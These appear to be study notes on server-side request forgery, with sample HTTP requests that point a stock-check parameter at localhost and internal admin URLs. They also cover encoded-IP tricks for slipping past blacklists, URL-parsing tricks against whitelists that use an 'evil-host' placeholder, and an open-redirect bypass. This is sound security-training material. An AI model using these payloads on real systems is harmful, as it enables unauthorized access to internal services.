# SSRF

- web secutiry vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location

- typical SSRF attack, the attacker might cause the server to make a connection to internal-only services withn the organization's infrastructure

- successful SSRF attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other backend systems and sometimes arbitary command execution

## Common SSRF attacks

### SSRF attacks against the server itself

- induces the application to make an HTTP request back to the server that is hosting the application via `localhost` or `127.0.0.1`

- eg - POST request

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

- This causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user
- attacker can modify the request to specify a URL local to the server itself

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
...
stockApi=http://localhost/admin
```

- when the request to the `/admin` URL comes from the local machine itself, the normal access controls are bypassed and the application grants full access to the admin functionality

### SSRF attacks against other back-end systems

- back-end systems often have non-routable private IP addresses
- eg - there is an administrative interface at the back-end URL `https://192.168.0.68/admin` and the attacker can exploit the SSRF attack by

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
...

stockApi=http://192.168.0.68/admin
```

## Circumventing common SSRF defenses

### SSRF with blacklist-based input filters

- instead of using IP `127.0.0.1` use
- 2130706433 # (127*(256^3)) + (1*(256^0))
- 017700000001
- 127.1
- registering your own domain name that resolves to `127.0.0.1` (can use `spoofed.burpcollaborator.net`)
- Obfuscating blocked strings using URL encoding or case variation

### SSRF with whitelist-based input filter

- some applications only allow input that matches, begins with, or contains, a whitelist of permitted value
- circumvent the filter by exploiting inconsistencies in URL parsing, eg
- `https://expected-host@evil-host`
- `https://evil-host#expected-host`
- `https://expected-host.evil-host`
- URL-encode characters to confuse the URL-parsing code

### Bypassing SSRF filters via open redirection

- eg - application contains an open redirection vulns in the following URL:
  `/product/nextProduct?currentProductId=6&path=http://evil-user.net`

- can use that open redirection to bypass the URL filter

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

## Blind SSRF vulnerabilities

- an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the front-end response

- impact of blind SSRF is lower than fully informed SSRF
- but sometimes, they can be exploited to achieve full remote code execution

- most reliable way to detect blind SSRF vulnerabilities is using out-of-band(OAST) techniques

## Finding hidden attack surface

- Partial URLs in requests
- URLs within data formats
- via the Referer Header
